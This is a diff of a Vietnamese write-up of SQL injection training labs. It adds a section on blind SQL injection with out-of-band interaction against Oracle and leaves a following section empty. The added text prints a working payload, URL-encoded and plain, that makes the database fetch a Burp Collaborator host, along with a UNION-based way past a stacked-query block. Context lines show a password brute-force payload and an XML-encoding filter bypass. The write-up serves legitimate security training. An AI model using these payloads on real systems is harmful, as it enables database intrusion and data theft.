@@ -165,8 +165,23 @@ Bruteforce password: Thêm `'%3bSELECT CASE WHEN substr(password,1,1)='a' THEN p
 Tiến hành tương tự với các ký tự từ 2 đến 20, ta thu được password=afwrv9geoqal4yozoxw0. Sử dụng username và password có được để đăng nhập, kết quả thành công.
 
 # 15. Blind SQL injection with out-of-band interaction
+Thử thực hiện DNS lookup với trường hợp database là Oracle:
+
+Thử chèn thêm đoạn code sau vào sau tracking cookie:
+```
+3BSELECT+EXTRACTVALUE%28xmltype%28%27%3C%3Fxml+version%3D%221.0%22+encoding%3D%22UTF-8%22%3F%3E%3C%21DOCTYPE+root+%5B+%3C%21ENTITY+%25+remote+SYSTEM+%22http%3A%2F%2Fgk4lihowe69pkkgl7fluaewn0e65zto.oastify.com%2F%22%3E+%25remote%3B%5D%3E%27%29%2C%27%2Fl%27%29+FROM+dual--
+```
+tương ứng với
+```
+';SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://gk4lihowe69pkkgl7fluaewn0e65zto.oastify.com/"> %remote;]>'),'/l') FROM dual--
+```
+Kiểm tra trong BurpCollaborator, kết quả không thành công. Có thể website đã chặn việc thực thi nhiều câu lệnh query trong chức năng Tracking. Như vậy, ta thay `';` thành `' UNION` rồi thử lại, kết quả câu lệnh query được thực thi thành công và trong Burp Collaborator đã nhận được request.
+
+![image](https://user-images.githubusercontent.com/103978452/202646694-d96b5591-b9d3-4587-8e31-92ee12948b39.png)
 
 # 16. Blind SQL injection with out-of-band data exfiltration
+
+
 
 # 17. SQL injection with filter bypass via XML encoding
 Dùng BurpSuite để bắt request check stock. Ta thấy phần body của request là một đoạn XML gồm productId và storeId. Khi ta thêm `&#45;&#45;` (tương ứng -- khi XML encode) vào sau storeId, kết quả trả vễ vẫn như bình thường. Như vậy, website có lỗ hổng SQLi.
